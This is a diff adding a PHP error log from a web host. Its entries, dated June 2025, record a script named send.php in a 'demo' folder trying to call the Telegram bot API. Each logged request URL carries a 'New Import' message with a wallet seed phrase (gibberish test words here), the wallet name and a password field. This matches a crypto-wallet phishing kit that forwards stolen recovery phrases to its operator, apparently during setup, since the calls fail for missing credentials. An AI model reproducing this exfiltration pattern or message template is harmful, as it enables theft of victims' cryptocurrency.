@@ -1,0 +1,10 @@
+[17-Jun-2025 03:42:37 America/Boise] PHP Warning:  Undefined variable $token in /home3/tuimebmy/public_html/demo/send.php on line 37
+[17-Jun-2025 03:42:37 America/Boise] PHP Warning:  Undefined variable $chat_id in /home3/tuimebmy/public_html/demo/send.php on line 41
+[17-Jun-2025 03:43:03 America/Boise] PHP Warning:  Undefined variable $token in /home3/tuimebmy/public_html/demo/send.php on line 38
+[17-Jun-2025 03:43:03 America/Boise] PHP Warning:  Undefined variable $chat_id in /home3/tuimebmy/public_html/demo/send.php on line 41
+[17-Jun-2025 03:43:03 America/Boise] PHP Warning:  file_get_contents(https://api.telegram.org/bot/sendMessage?text=%0A%F0%9F%94%90+New+Import%0A----------------------------%0A%F0%9F%A7%BE+Method%3A+Phrase+Key%0A%F0%9F%93%9B+Wall%3A+Leather+Wallet%0A%F0%9F%93%9C+Data%3A+gshdg+jhsjhfd+jhshjsjf+jhsjfhjs+jhgsjfgjsf+jhfjhsj+jgsfjgs+jhfsjhgs+jgsfjgs+jghsjfg+jgfgs+jghsfjg%0A%F0%9F%94%91+Pass%3A+NULL%0A----------------------------%0A): Failed to open stream: HTTP request failed! HTTP/1.1 404 Not Found
+ in /home3/tuimebmy/public_html/demo/send.php on line 40
+[17-Jun-2025 03:44:54 America/Boise] PHP Warning:  Undefined variable $token in /home3/tuimebmy/public_html/demo/send.php on line 38
+[17-Jun-2025 03:44:54 America/Boise] PHP Warning:  Undefined variable $chat_id in /home3/tuimebmy/public_html/demo/send.php on line 41
+[17-Jun-2025 03:44:54 America/Boise] PHP Warning:  file_get_contents(https://api.telegram.org/bot/sendMessage?text=%0A+New+Import%0A----------------------------%0A+Method%3A+Phrase+Key%0A+Wall%3A+Leather+Wallet%0A+Data%3A+gshdg+jhsjhfd+jhshjsjf+jhsjfhjs+jhgsjfgjsf+jhfjhsj+jgsfjgs+jhfsjhgs+jgsfjgs+jghsjfg+jgfgs+jghsfjg%0A+Pass%3A+NULL%0A----------------------------%0A): Failed to open stream: HTTP request failed! HTTP/1.1 404 Not Found
+ in /home3/tuimebmy/public_html/demo/send.php on line 40
